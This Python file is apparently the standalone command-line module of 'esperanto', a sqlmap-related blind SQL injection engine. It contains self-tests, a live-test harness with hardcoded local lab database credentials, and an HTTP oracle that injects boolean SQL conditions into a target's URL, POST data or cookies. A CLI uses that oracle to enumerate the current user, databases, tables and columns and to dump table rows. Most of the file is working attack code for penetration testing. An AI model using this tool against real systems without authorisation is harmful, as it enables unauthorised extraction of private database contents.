#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from . import __version__
from .atlas import _REPL
from .engine import Esperanto, hostExtract
from .records import (
    OracleUndecided, ExtractResult, QueryBudgetExceeded)

_SITE = "https://sqlmap.org"

# ratio-mode confidence margin: if the true/false similarity scores are within this of each
# other the page can't be classified, so the oracle returns UNDECIDED rather than guessing.
_RATIO_MARGIN = 0.05


def _sqliteOracle(block=None):
    """In-memory SQLite boolean oracle for the self-test (DBMS hidden from prober).
    `block` is a regex of constructs to refuse, used to force fallback modes."""
    import re as _re
    import sqlite3
    con = sqlite3.connect(":memory:")
    con.execute("CREATE TABLE users (id INTEGER, name TEXT)")
    con.execute("INSERT INTO users VALUES (1, 'Admin-42')")
    con.commit()
    pat = _re.compile(block) if block else None

    def oracle(condition):
        if pat and pat.search(condition):
            return False
        try:
            cur = con.execute("SELECT CASE WHEN (%s) THEN 1 ELSE 0 END" % condition)
            return cur.fetchone()[0] == 1
        except sqlite3.DatabaseError:
            # unsupported/rejected SQL is a valid negative capability result; only
            # transport/observation failures are allowed to raise (oracle contract)
            return False

    return oracle


def _selftest():
    # exercise every compare mode against one byte-ordered, case-sensitive backend
    # (SQLite) by selectively refusing constructs - proves each extraction path
    code = r"\b(ASCII|UNICODE|ORD|CODEPOINT|ASCII_VAL|ASCW|UNICODE_CODE|TO_CODE_POINTS)\("
    coll = r"COLLATE|\bBINARY\s*\(|AS\s+(BLOB|bytea|VARBINARY|RAW)|NLSSORT|UTL_RAW"
    hexb = r"\bHEX\(|RAWTOHEX|ENCODE\(|BINTOHEX|HEX_ENCODE|TO_HEX|BINTOSTR"
    modes = (
        ("code",      None),
        ("collation", r"(?i)(%s)" % code),
        ("hex",       r"(?i)(%s|%s)" % (code, coll)),
        ("ordinal",   r"(?i)(%s|%s|%s)" % (code, coll, hexb)),
    )
    for expected, block in modes:
        esp = Esperanto(_sqliteOracle(block=block))
        dialect = esp.discover()
        got = esp.extract("(SELECT name FROM users WHERE id=1)")
        assert dialect.compare == expected, "expected %s mode, got %s" % (expected, dialect.compare)
        assert got == "Admin-42", "%s-mode extraction failed: %r" % (expected, got)
        print("  %-8s mode: %-52r -> extracted %r in %d queries" % (
            expected, dialect, got, esp.queryCount))
    # equality mode exercised directly (charset scan)
    esp = Esperanto(_sqliteOracle())
    esp.discover()
    esp.dialect.compare = "equality"
    assert esp.extract("(SELECT name FROM users WHERE id=1)") == "Admin-42"
    print("  equality mode: charset-scan extraction -> OK")

    # the detective: name the backend blind
    esp = Esperanto(_sqliteOracle())
    esp.discover()
    verdict = esp.identify()
    assert verdict["product"] == "SQLite", "identify failed: %r" % verdict
    print("  identify: product=%(product)r version=%(version)r dual=%(dual)s" % verdict)

    # bytes-first extraction: byte-exact, encoding chosen by the caller
    esp = Esperanto(_sqliteOracle())
    esp.discover()
    mb = "('A' || CHAR(233) || CHAR(8364))"       # 'A' + U+00E9 + U+20AC, built via ASCII SQL (py2/py3-safe, no non-ASCII source)
    raw = esp.extractBytes(mb)
    assert raw == u"A\xe9\u20ac".encode("utf-8"), "extractBytes: %r" % raw
    assert esp.extractText(mb) == u"A\xe9\u20ac"
    print("  extractBytes: %r  extractText: %r" % (raw, esp.extractText(mb)))

    # quorum: a noisy oracle that flips/errors a minority of probes must not corrupt.
    # tested across several seeds so the pass doesn't hinge on one lucky sequence.
    import random as _random
    for seed in (1234, 7, 99, 2026):
        base = _sqliteOracle()
        rng = _random.Random(seed)

        def noisy(cond, _b=base, _r=rng):
            roll = _r.random()
            if roll < 0.12:
                raise RuntimeError("transient")         # 12% errors (resampled)
            if roll < 0.20:
                return not _b(cond)                     # 8% lies
            return _b(cond)

        esp = Esperanto(noisy, quorum=6)
        esp.discover()
        got = esp.extract("(SELECT name FROM users WHERE id=1)")
        assert got == "Admin-42", "quorum extraction (seed %d) failed: %r" % (seed, got)
    print("  quorum=6 under 20%% noisy oracle (12%% err + 8%% lies) -> 'Admin-42' across 4 seeds")

    # -- integrity guards (peer-review round 4) --------------------------------
    # empty/NULL are falsey; a bounded prefix (incl. limit=0) is incomplete+truncated
    assert not ExtractResult("") and not ExtractResult(None)
    esp = Esperanto(_sqliteOracle())
    esp.discover()
    zero = esp.extractResult("'abc'", limit=0)
    assert zero.value == "" and zero.truncated and not zero.complete, "limit=0: %r" % zero
    # an invalid expression must NOT masquerade as a complete SQL NULL
    bad = esp.extractResult("NO_SUCH_FN(1)")
    assert bad.value is None and not bad.is_null and not bad.complete and bad.warnings, "invalid->NULL: %r" % bad
    # integer extraction must raise, not saturate
    try:
        esp.extractInteger("100", maximum=10)
        assert False, "extractInteger saturated silently"
    except OverflowError:
        pass
    # an unobservable oracle must FAIL CLOSED, never silently 'succeed'. two guarantees:
    # (a) discovery aborts (a broken oracle can't manufacture a working dialect); while
    #     probing candidate rungs an unobservable probe reads False, so sanity fails ->
    #     RuntimeError, never a bogus discovered dialect
    try:
        Esperanto((lambda c: (_ for _ in ()).throw(RuntimeError("down")))).discover()
        assert False, "broken oracle silently discovered a dialect"
    except RuntimeError:
        pass
    # (b) a DATA READ never manufactures False from an unobservable probe: it raises
    #     OracleUndecided (the whole point - a flaky read must not corrupt a bit)
    esp = Esperanto(_sqliteOracle())
    esp.discover()
    esp.oracle = lambda c: (_ for _ in ()).throw(RuntimeError("down"))   # break it post-discovery
    try:
        esp.extract("(SELECT MAX(name) FROM users)")
        assert False, "undecided oracle silently became data"
    except OracleUndecided:
        pass
    # embedded/leading NUL must not truncate (whole-value verification recovers it)
    import sqlite3
    con = sqlite3.connect(":memory:")
    con.execute("CREATE TABLE t (a TEXT)")
    con.execute("INSERT INTO t VALUES (?)", ("A\x00B",))
    con.commit()

    def nulOracle(cond):
        try:
            return con.execute("SELECT CASE WHEN (%s) THEN 1 ELSE 0 END" % cond).fetchone()[0] == 1
        except sqlite3.DatabaseError:
            return False
    esp = Esperanto(nulOracle)
    esp.discover()
    nul = esp.extractResult("(SELECT a FROM t)")
    assert nul.value == "A\x00B" and nul.complete, "embedded NUL: %r" % nul

    # -- round-5 adversarial regressions --------------------------------------
    esp = Esperanto(_sqliteOracle(), maxlen=0)
    esp.discover()
    z = esp.extractResult("'abc'")
    assert z.value == "" and z.truncated and not z.complete, "maxlen=0: %r" % z
    esp = Esperanto(_sqliteOracle())
    esp.discover()
    for bad in (("-100", 10), ("100", 10)):     # symmetric integer cap
        try:
            esp.extractInteger(bad[0], maximum=bad[1])
            assert False, "int cap not enforced for %s" % bad[0]
        except OverflowError:
            pass
    try:                                        # None observation -> undecided
        Esperanto(lambda c: None, retries=0)._ask("1=1")
        assert False, "None became False"
    except OracleUndecided:
        pass
    try:                                        # hard query budget
        Esperanto(_sqliteOracle(), max_queries=0)._ask("1=1")
        assert False, "budget not enforced"
    except QueryBudgetExceeded:
        pass
    esp = Esperanto(_sqliteOracle())           # ordered PoC refused in equality mode
    esp.discover()
    esp.dialect.compare = "equality"
    try:
        esp.poc("'A'")
        assert False, "equality-mode PoC fabricated ordering"
    except RuntimeError:
        pass
    # a UTF-16 code-unit fn returning an isolated surrogate must not be "complete"
    con = sqlite3.connect(":memory:")
    con.execute("CREATE TABLE s (v TEXT)")
    con.execute(u"INSERT INTO s VALUES ('\U0001F642')")
    con.create_function("ASCII", 1, lambda x: None if not x else (
        ord(x[0]) if ord(x[0]) <= 0xFFFF else 0xD800 + ((ord(x[0]) - 0x10000) >> 10)))
    con.commit()
    nohex = __import__("re").compile(r"(?i)\bHEX\(|RAWTOHEX|ENCODE\(|BINTOHEX|HEX_ENCODE|TO_HEX|BINTOSTR")

    def surOracle(cond):
        if nohex.search(cond):
            return False
        try:
            return con.execute("SELECT CASE WHEN (%s) THEN 1 ELSE 0 END" % cond).fetchone()[0] == 1
        except sqlite3.DatabaseError:
            return False
    esp = Esperanto(surOracle)
    esp.discover()
    sur = esp.extractResult("(SELECT v FROM s)")
    assert sur.value == _REPL and not sur.complete, "isolated surrogate accepted: %r" % sur

    print("  integrity: fail-closed + NULL/empty + limit0 + int-cap + budget + surrogate + PoC -> guarded")

    # -- InferenceStrategy: the frozen hand-off is a *sufficient* host interface --
    oracle = _sqliteOracle()
    esp = Esperanto(oracle)
    esp.discover()
    strat = esp.strategy()
    try:                                            # immutable
        strat.compare_mode = "x"
        assert False, "strategy is not frozen"
    except AttributeError:
        pass
    # extract using ONLY the strategy + oracle (no Esperanto retrieval code)
    got = hostExtract(oracle, strat, "(SELECT name FROM users WHERE id=1)")
    assert got.value == "Admin-42" and got.exact, "hostExtract via strategy failed: %r" % got
    row = strat.asQueriesRow()
    assert row["substring"] and row["length"] and row["inference"], "queries-row incomplete: %r" % row
    print("  strategy: frozen + hostExtract('%s')=%r (exact) + queries.xml row rendered" % (strat.compare_mode, got.value))
    print("SELF-TEST PASSED (all compare modes + identify + bytes + quorum + integrity + strategy)")


def _livetest(only=None, waf=False):
    """Live blind validation against real DBMS instances (dev harness, '--live').
    Each backend is handed ONLY a boolean oracle - dialect-mismatch errors read as
    False, the transaction rolled back per probe - and is never told which engine it
    is poking. Requires the driver + a reachable instance; skips what it can't reach."""
    import re as _re
    SECRET = "Zagreb-Ka5tel"
    block = _re.compile(r"(?i)\b(ASCII|UNICODE|ORD|CODEPOINT|ASCII_VAL|ASCW|UNICODE_CODE|CODE)\s*\(") if waf else None

    def cursor(con, wrap):
        def ask(cond):
            if block and block.search(cond):
                return False
            cur = con.cursor()
            try:
                cur.execute(wrap % cond)
                row = cur.fetchone()
                return bool(row) and int(row[0]) == 1
            except Exception:
                try:
                    con.rollback()
                except Exception:
                    pass
                return False
            finally:
                try:
                    cur.close()
                except Exception:
                    pass
        return ask

    def prep(con, ddl):
        cur = con.cursor()
        for stmt in ddl:
            try:
                cur.execute(stmt)
            except Exception:
                if hasattr(con, "rollback"):
                    con.rollback()
        con.commit()
        cur.close()

    def sqlite():
        import sqlite3
        con = sqlite3.connect(":memory:")
        prep(con, ("CREATE TABLE esp_probe (name TEXT)", "INSERT INTO esp_probe VALUES ('%s')" % SECRET))
        return cursor(con, "SELECT CASE WHEN (%s) THEN 1 ELSE 0 END")

    def mysql():
        import pymysql
        con = pymysql.connect(host="127.0.0.1", port=13306, user="root", password="root", database="lab")
        prep(con, ("DROP TABLE IF EXISTS esp_probe", "CREATE TABLE esp_probe (name VARCHAR(64))",
                   "INSERT INTO esp_probe VALUES ('%s')" % SECRET))
        return cursor(con, "SELECT CASE WHEN (%s) THEN 1 ELSE 0 END")

    def postgres():
        import psycopg2
        con = psycopg2.connect(host="127.0.0.1", port=15432, user="esp", password="pass", dbname="espdb")
        prep(con, ("DROP TABLE IF EXISTS esp_probe", "CREATE TABLE esp_probe (name VARCHAR(64))",
                   "INSERT INTO esp_probe VALUES ('%s')" % SECRET))
        return cursor(con, "SELECT CASE WHEN (%s) THEN 1 ELSE 0 END")

    def oracle():
        import oracledb
        con = oracledb.connect(user="appu", password="appu", dsn="127.0.0.1:1521/FREEPDB1")
        prep(con, ("BEGIN EXECUTE IMMEDIATE 'DROP TABLE esp_probe'; EXCEPTION WHEN OTHERS THEN NULL; END;",
                   "CREATE TABLE esp_probe (name VARCHAR2(64))", "INSERT INTO esp_probe VALUES ('%s')" % SECRET))
        return cursor(con, "SELECT CASE WHEN (%s) THEN 1 ELSE 0 END FROM DUAL")

    def mssql():
        import pymssql
        con = pymssql.connect(server="127.0.0.1", port="11433", user="sa", password="Esp_pass123", database="master")
        prep(con, ("IF OBJECT_ID('esp_probe') IS NOT NULL DROP TABLE esp_probe",
                   "CREATE TABLE esp_probe (name VARCHAR(64))", "INSERT INTO esp_probe VALUES ('%s')" % SECRET))
        return cursor(con, "SELECT CASE WHEN (%s) THEN 1 ELSE 0 END")

    ok = True
    for name, factory in (("SQLite", sqlite), ("MySQL", mysql), ("PostgreSQL", postgres),
                          ("Oracle", oracle), ("MSSQL", mssql)):
        if only and name.lower() not in only:
            continue
        try:
            oracle_fn = factory()
        except Exception as ex:
            print("  %-12s SKIP (%s)" % (name, ex))
            continue
        esp = Esperanto(oracle_fn)
        try:
            esp.discover()
            got = esp.extract("(SELECT MAX(name) FROM esp_probe)")
            product = esp.identify()["product"]
        except Exception as ex:
            print("  %-12s FAIL (%s)" % (name, ex))
            ok = False
            continue
        passed = got == SECRET
        ok = ok and passed
        print("  %-12s %s  product=%-12r secret=%r%s" % (
            name, "PASS" if passed else "FAIL", product, got, "  [WAF]" if waf else ""))
    return ok


def _httpOracle(url, data=None, cookie=None, headers=None, string=None, code=None):
    """A boolean oracle over a real HTTP target, for standalone use. The condition is
    substituted at the injection marker: '[INFERENCE]' is replaced verbatim (you supply
    the context, e.g. `id=1 AND [INFERENCE]`), else a single '*' is replaced with
    ` AND (<condition>)`.

    True/false is decided by a reduced port of sqlmap's response differentiation - the
    Pareto 80%: explicit --string/--code win; otherwise it CALIBRATES from
    two true (1=1) baselines + one false (1=2) and auto-picks the cheapest reliable
    signal - HTTP status code, else a stable text line present in true but not false,
    else a difflib similarity ratio. Two noise-killers borrowed from sqlmap make it
    robust: DYNAMIC content (lines that differ between two identical true requests, e.g.
    timestamps/CSRF/nonces) is stripped, and the REFLECTED injected condition is removed
    from the body so it can't skew the match (sqlmap's "reflective values ... filtering
    out"). Not a replacement for checkBooleanExpression - just its high-value core."""
    import difflib
    try:                                                    # py3
        from urllib.parse import quote as _quote, urlsplit
        from http.client import HTTPConnection, HTTPSConnection
    except ImportError:                                     # py2
        from urllib import quote as _quote
        from urlparse import urlsplit
        from httplib import HTTPConnection, HTTPSConnection

    if "[INFERENCE]" not in (url + (data or "")) and "*" not in (url + (data or "")):
        url = url + "*"                     # no marker given -> inject at the end of the URL by default
        print("[i] no injection marker ('*' or '[INFERENCE]') given; defaulting to end of URL: %s" % url)

    # ONE kept-alive connection reused across every probe. a blind dump is thousands of
    # requests; opening a fresh TCP+TLS handshake per probe (what urlopen does) is ~0.2s of
    # pure handshake that dwarfs the request itself - reuse drops per-probe latency ~5-10x.
    _conn = {"c": None, "key": None}

    def _fresh(scheme, netloc):
        return (HTTPSConnection if scheme == "https" else HTTPConnection)(netloc, timeout=30)

    def fetch(cond):
        # encode the INJECTED fragment fully and splice it into the (already-encoded) URL, so a
        # '&' or '%' produced by the SQL (Access '&' concat, LIKE '%') becomes %26/%25 inside the
        # parameter VALUE - it can't turn into a new HTTP parameter separator or a stray escape.
        if "[INFERENCE]" in (url + (data or "")):           # verbatim marker (caller owns context)
            payload = _quote(cond, safe="")
            u_raw = url.replace("[INFERENCE]", payload)
            d_raw = data.replace("[INFERENCE]", payload) if data else data
        else:                                               # '*' -> boolean AND at the mark
            ins = _quote(" AND (%s)" % cond, safe="")
            u_raw = url.replace("*", ins, 1) if "*" in url else url
            d_raw = data.replace("*", ins, 1) if (data and "*" in data) else data
        parts = urlsplit(u_raw)                             # the surrounding URL is already user-encoded
        path = parts.path or "/"
        if parts.query:
            path += "?" + parts.query
        body = d_raw.encode("utf-8") if d_raw else None
        method = "POST" if body else "GET"
        hdrs = {"User-Agent": "esperanto", "Connection": "keep-alive"}
        if body:
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
        if cookie:
            hdrs["Cookie"] = cookie
        for h in (headers or []):
            k, _, v = h.partition(":")
            hdrs[k.strip()] = v.strip()
        key = (parts.scheme, parts.netloc)
        for attempt in (1, 2):                              # reuse the socket; reconnect once if it dropped
            if _conn["c"] is None or _conn["key"] != key:
                if _conn["c"] is not None:
                    try:
                        _conn["c"].close()
                    except Exception:
                        pass
                _conn["c"], _conn["key"] = _fresh(parts.scheme, parts.netloc), key
            try:
                _conn["c"].request(method, path, body, hdrs)
                resp = _conn["c"].getresponse()             # http.client returns 4xx/5xx too (no raise)
                raw, status = resp.read(), resp.status      # read fully so the socket stays reusable
                return raw.decode("utf-8", "replace"), status
            except Exception:
                try:
                    _conn["c"].close()
                except Exception:
                    pass
                _conn["c"] = None                           # force a reconnect on the retry
        return None, None                                   # transport FAILED -> undecided, NOT ("",0)
                                                            # (an empty body must never look like a False page)

    dyn = set()

    def _deReflect(body, cond):
        return body.replace(cond, "") if cond else body     # drop the reflected payload

    def _clean(body, cond):
        body = _deReflect(body, cond)
        return "\n".join(ln for ln in body.split("\n") if ln not in dyn) if dyn else body

    mode, wanted, base = None, None, {}
    if string is not None:
        mode = "string"
    elif code is not None:
        mode, wanted = "code", int(code)
    else:                                                   # auto-calibrate
        (t1, s1), (t2, s2), (f1, sf) = fetch("1=1"), fetch("1=1"), fetch("1=2")
        if t1 is None or t2 is None or f1 is None:
            raise SystemExit("[!] cannot calibrate oracle: transport failed on a control request")
        dyn = set(t1.split("\n")) ^ set(t2.split("\n"))     # varies between identical requests -> dynamic
        tc, fc = _clean(t1, "1=1"), _clean(f1, "1=2")
        if s1 == s2 and s1 != sf:                           # (1) HTTP status alone separates true/false
            mode, wanted = "code", s1
        else:
            # (2) a SHORT distinctive true-only marker: the longest contiguous chunk that is
            # in the true page but not the false one, capped to a "longish" string (never the
            # whole document) and verified stable across BOTH true baselines
            t2c = _clean(t2, "1=1")
            blocks = difflib.SequenceMatcher(None, fc, tc, autojunk=False).get_opcodes()
            chunks = sorted((tc[b1:b2].strip() for op, _a1, _a2, b1, b2 in blocks
                             if op in ("insert", "replace")), key=len, reverse=True)
            wanted = None
            for chunk in chunks:
                marker = chunk[:64]                         # bounded, distinctive marker
                if len(marker) >= 6 and marker in t2c and marker not in fc:
                    mode, wanted = "autostring", marker
                    break
            if wanted is None:                              # (3) similarity ratio floor
                mode, base = "ratio", {"t": tc, "f": fc}
    if string is None:
        print("[i] calibrated oracle: %s%s" % (mode, (" (%r)" % wanted) if mode in ("code", "autostring") else ""))

    def classify(cond):
        body, status = fetch(cond)
        if body is None:                                    # transport failure -> UNDECIDED (tri-state):
            return None                                     # let the engine retry/degrade, never a fake bool
        if mode == "string":
            return string in body
        if mode == "code":
            return status == wanted
        if mode == "autostring":
            return wanted in _clean(body, cond)
        c = _clean(body, cond)
        st = difflib.SequenceMatcher(None, c, base["t"]).quick_ratio()
        sf = difflib.SequenceMatcher(None, c, base["f"]).quick_ratio()
        if abs(st - sf) < _RATIO_MARGIN:                    # too close to call -> undecided, not a coin-flip
            return None
        return st > sf

    state = {"n": 0, "dead": False}

    def oracle(cond):
        # PERIODIC control revalidation: over thousands of requests the baseline can drift
        # (auth expiry, rate-limit page, CDN challenge, redeploy, marker swap). Every 256 probes
        # re-run the known controls; if 1=1/1=2 stop separating, SUSPEND (return undecided) rather
        # than keep feeding a broken model into bisection.
        state["n"] += 1
        if state["n"] % 256 == 0 or state["dead"]:
            t, f = classify("1=1"), classify("1=2")
            state["dead"] = not (t is True and f is False)
            if state["dead"]:
                print("[!] oracle controls no longer separate (1=1=%r, 1=2=%r) - suspending" % (t, f))
                return None
        return classify(cond)

    return oracle


def _safeterm(s):
    """Neutralize control/escape bytes in DB content before it reaches the terminal - stored
    values can carry ANSI cursor/title/OSC sequences, embedded newlines or fake log prefixes
    that would otherwise manipulate or forge the operator's console."""
    if s is None:
        return s
    # escape C0 (< 0x20), DEL (0x7f) AND C1 (0x80-0x9f) controls - a bare 0x9b is an ANSI CSI
    # introducer, so leaving the C1 range through would still let stored content drive the terminal
    return "".join(c if (u" " <= c < u"\x7f") or c > u"\x9f" else "\\x%02x" % ord(c) for c in s)


def _printTable(columns, rows):
    """Render a bordered, column-aligned table (sqlmap-style) instead of raw ' | ' joins."""
    cells = [["NULL" if v is None else _safeterm(v) for v in row] for row in rows]
    widths = [max([len(columns[i])] + [len(r[i]) for r in cells]) for i in range(len(columns))]
    bar = "+" + "+".join("-" * (w + 2) for w in widths) + "+"
    line = lambda vals: "| " + " | ".join(v.ljust(widths[i]) for i, v in enumerate(vals)) + " |"
    print(bar)
    print(line(columns))
    print(bar)
    for r in cells:
        print(line(r))
    print(bar)


import binascii as _binascii
_HEX = set("0123456789abcdefABCDEF")


def _previewFramed(partial):
    """A hex-framed row payload decoded into the value AS IT ARRIVES - including the in-progress
    token's completed bytes - so the live line grows CHARACTER BY CHARACTER, like sqlmap. Handles
    BOTH grammars: length-framed `V<len>:<hex>;` / `N;` and the legacy `V<hex>` / `N` (','-sep).
    Returns None when `partial` isn't a framed payload."""
    if not partial or partial[0] not in "NV" or any(c not in _HEX and c not in ",:;NV" for c in partial):
        return None

    def _dec(h):
        h = h[:len(h) - (len(h) % 2)]               # only WHOLE bytes so far
        try:
            return _binascii.unhexlify(h).decode("utf-8", "replace")
        except Exception:
            return "?"

    out = []
    if ";" in partial or ":" in partial:            # length-framed grammar: V<len>:<hex>; / N;
        for t in partial.split(";"):
            if not t:
                continue
            if t == "N":
                out.append("NULL")
            elif t.startswith("V"):
                _lp, _sep, hx = t[1:].partition(":")
                out.append(_dec(hx))
        return ", ".join(out)
    for t in partial.split(","):                    # legacy grammar
        if t == "N":
            out.append("NULL")
        elif t.startswith("V"):
            out.append(_dec(t[1:]))
    return ", ".join(out)


def _scalar(esp, expr):
    """A user-facing scalar that DISPLAYS its integrity instead of erasing it: an inexact
    (truncated / case-ambiguous / unverified) value is shown with its status, never as if exact."""
    r = esp.extractResult(expr)
    if r.value is None:
        return "NULL" if r.is_null else "n/a (unresolved)"
    return _safeterm(r.value) if r.exact else "%s   [%s]" % (_safeterm(r.value), r.integrity)


def _report(esp, args):
    """Run the requested action(s) against a discovered target and print the results."""
    print("[*] dialect: %r" % esp.dialect)
    verdict = esp.identify()
    print("[*] back-end: %s %s" % (verdict.get("product") or "unknown", verdict.get("version") or ""))
    # scope schema/db lookups to -D, else the current database (and, for a specific table,
    # the schema it actually lives in) - WITHOUT this a table that ALSO exists in a system
    # schema (e.g. MySQL's mysql/information_schema 'users') merges columns and yields a
    # garbage 0-row dump. mirrors the sqlmap handler's _scopeFor.
    scope = args.db
    if scope is None and (args.tables or args.columns or args.dump):
        dbexpr = esp.dialect.identity.get("database")
        try:
            r = esp.extractResult(dbexpr) if dbexpr else None
            # the scope name becomes a keyset bound / schema qualifier - a case/accent-ambiguous
            # spelling would mis-target (merge a system-schema table, yield a 0-row dump), so
            # require a byte-exact read, exactly as the sqlmap handler's _safeExtract does.
            cur = r.value if (r and r.exact) else None
            if r and r.value and not r.exact:
                print("[!] scope database name not byte-exact (%s) - not scoping" % r.integrity)
        except Exception:
            cur = None
        if args.tbl and (args.columns or args.dump):
            try:
                scope = cur if (cur and esp.hasTable(args.tbl, cur)) else (esp.tableSchema(args.tbl) or cur)
            except Exception:
                scope = cur
        else:
            scope = cur
        if scope:
            print("[i] scoping to database/schema: %s" % scope)
    if args.current_user:
        expr = esp.dialect.identity.get("user")
        print("[*] current user: %s" % (_scalar(esp, expr) if expr else "n/a"))
    if args.current_db:
        expr = esp.dialect.identity.get("database")
        print("[*] current database: %s" % (_scalar(esp, expr) if expr else "n/a"))
    if args.tables:
        print("[i] fetching tables ...")
        print("[*] tables: %s" % ", ".join(esp.enumerate("table", schema=scope) or ["<none>"]))
    if args.columns:
        if not args.tbl:
            print("[!] --columns needs -T <table>")
        else:
            print("[i] fetching columns for '%s' ..." % args.tbl)
            print("[*] columns of %s: %s" % (args.tbl, ", ".join(esp.columns(args.tbl, schema=scope) or ["<none>"])))
    if args.dump:
        if not args.tbl:
            print("[!] --dump needs -T <table>")
        else:
            cols = [c.strip() for c in args.col.split(",")] if args.col else None
            if cols is None:                    # enumerate columns FIRST (own phase), so the
                print("[i] fetching columns for table '%s' ..." % args.tbl)   # 'entries' phase below streams ROWS, not column names
                cols = esp.columns(args.tbl, schema=scope) or None
            print("[i] fetching entries for table '%s' ..." % args.tbl)
            # NO silent internal cap: dump ALL rows (bounded by the live COUNT) and always
            # print whether the result came back complete.
            try:
                limit = esp.extractInteger("(SELECT COUNT(*) FROM %s)" % esp.qualify(args.tbl, scope)) or 10
            except Exception:
                limit = 1 << 30
            result = esp.dump(args.tbl, columns=cols, schema=scope, limit=limit)
            if not result or not result["columns"]:
                print("[!] could not dump %s" % args.tbl)
            else:
                tag = "" if result["complete"] else " - INCOMPLETE (%s)" % (result.get("keyed_by") or "best-effort")
                if not result.get("exact", True):    # coverage complete but content collation-dependent
                    tag += " - INEXACT (case/accents may differ)"
                print("[*] Table: %s (%d entries%s)" % (args.tbl, len(result["rows"]), tag))
                _printTable(result["columns"], result["rows"])


def _banner():
    # modest CLI identity, sqlmap-styled: a small globe (DBMS-agnostic/universal) + the Esperanto
    # green star. Colored only on a TTY; pure-ASCII (no coding header on this file); text columns
    # aligned at a fixed offset so the escape codes (zero display width) don't skew them.
    import sys as _sys
    tty = _sys.stdout.isatty()
    G = "\033[0;32m" if tty else ""       # esperanto green (the globe)
    S = "\033[1;32m" if tty else ""       # bright green (the star)
    W = "\033[1;37m" if tty else ""       # bold white (the name)
    U = "\033[4;37m" if tty else ""       # underline (the site)
    R = "\033[0m" if tty else ""
    return (
        "     %(G)s___%(R)s\n"
        "    %(G)s/ _ \\%(R)s    %(W)sesperanto%(R)s {%(ver)s}\n"
        "   %(G)s| (_) |%(R)s\n"
        "    %(G)s\\___/ %(S)s*%(R)s  %(U)s%(site)s%(R)s\n"
    ) % dict(G=G, S=S, W=W, U=U, R=R, ver=__version__, site=_SITE)


def main(argv=None):
    """Standalone entry point: drive the engine against a live HTTP target."""
    import argparse

    class _Formatter(argparse.HelpFormatter):
        # show the metavar ONCE ('-H, --header HEADER', not '-H HEADER, --header HEADER'),
        # like sqlmap's own help, so option/help stays on a single line
        def __init__(self, prog):
            argparse.HelpFormatter.__init__(self, prog, max_help_position=28)

        def _format_action_invocation(self, action):
            if not action.option_strings or action.nargs == 0:
                return ", ".join(action.option_strings) or argparse.HelpFormatter._format_action_invocation(self, action)
            metavar = self._format_args(action, action.dest.upper())    # py2/py3-portable default metavar
            return "%s %s" % (", ".join(action.option_strings), metavar)

    parser = argparse.ArgumentParser(
        prog="esperanto", formatter_class=_Formatter,
        usage="esperanto -u URL [options]",     # short synopsis, not an auto-listing of every flag
        description="DBMS-agnostic blind-SQLi enumeration engine (standalone)")
    parser.add_argument("--version", action="version", version="esperanto %s (%s)" % (__version__, _SITE))
    parser.add_argument("-u", "--url", help="target URL (with a '*'/'[INFERENCE]' marker)")
    parser.add_argument("--data", help="POST data string")
    parser.add_argument("--cookie", help="HTTP Cookie header")
    parser.add_argument("-H", "--header", action="append", help="extra HTTP header (repeatable)")
    parser.add_argument("--string", help="match string for a True response")
    parser.add_argument("--code", type=int, help="HTTP code for a True response")
    parser.add_argument("--banner", action="store_true", help="retrieve DBMS banner")
    parser.add_argument("--current-user", action="store_true", dest="current_user", help="retrieve current user")
    parser.add_argument("--current-db", action="store_true", dest="current_db", help="retrieve current database")
    parser.add_argument("--tables", action="store_true", help="enumerate tables")
    parser.add_argument("--columns", action="store_true", help="enumerate table columns (needs -T)")
    parser.add_argument("--dump", action="store_true", help="dump table entries (needs -T)")
    parser.add_argument("-D", dest="db", help="database/schema to enumerate")
    parser.add_argument("-T", dest="tbl", help="table to enumerate")
    parser.add_argument("-C", dest="col", help="columns to dump (comma-separated)")
    # internal dev/test harness switches - functional but hidden from --help (--live drives the
    # local-Docker DBMS livetest; --waf is a livetest-only fault-injection mode, NOT a real WAF bypass)
    parser.add_argument("--live", action="store_true", help=argparse.SUPPRESS)
    parser.add_argument("--waf", action="store_true", help=argparse.SUPPRESS)
    parser.add_argument("--self-test", action="store_true", dest="selftest", help=argparse.SUPPRESS)
    args, engines = parser.parse_known_args(argv)

    if args.live:
        names = [a.lower() for a in engines if not a.startswith("-")]
        return 0 if _livetest(only=names or None, waf=args.waf) else 1
    if args.selftest:                       # self-test only on EXPLICIT request
        _selftest()
        return 0
    print(_banner())                        # CLI identity (after the dev-harness paths above)
    if not args.url:                        # no target and nothing to do -> show help, don't surprise
        parser.print_help()
        return 1

    target = args.url if "://" in args.url else ("http://" + args.url)   # tolerate a scheme-less URL
    esp = Esperanto(_httpOracle(target, args.data, args.cookie, args.header,
                                args.string, args.code))
    import sys as _sys
    _tty = _sys.stdout.isatty()
    def _charLive(partial, total):
        # LIVE char-by-char on ONE rewriting line, exactly like sqlmap: the value grows in
        # place ([*] retrieved: e -> em -> ema -> ...) and is FINALIZED with a newline when
        # complete, so it can't collide with the next message. Framed rows preview as cells.
        shown = _previewFramed(partial)
        if shown is None:
            shown = partial
        _sys.stdout.write("\r\033[K[i] retrieved: %s" % _safeterm(shown[-200:]))
        if len(partial) >= total:               # value complete -> keep it and drop to a new line
            _sys.stdout.write("\n")
        _sys.stdout.flush()
    def _plainLive(value):                      # piped/non-tty: one plain line per value, no control codes
        _sys.stdout.write("[i] retrieved: %s\n" % _safeterm(value))
        _sys.stdout.flush()
    if _tty:
        esp._charProgress = _charLive           # animated char-by-char is the sole feedback on a terminal
    else:
        esp._progress = _plainLive              # logs/pipes get clean per-value lines instead
    print("[i] discovering the back-end SQL dialect (agnostic mode) ...")
    try:
        esp.discover()
        _report(esp, args)
    except RuntimeError as ex:              # unreachable/uninjectable target -> clean message, no traceback
        print("[!] could not establish a working boolean oracle (%s)" % ex)
        print("    check the target is reachable and injectable, and the marker/--string/--code are right")
        return 1
    except KeyboardInterrupt:               # Ctrl-C mid-extraction -> clean stop, no traceback
        print("\n[!] aborted by user")
        return 1
    return 0


if __name__ == "__main__":
    import sys
    sys.exit(main())
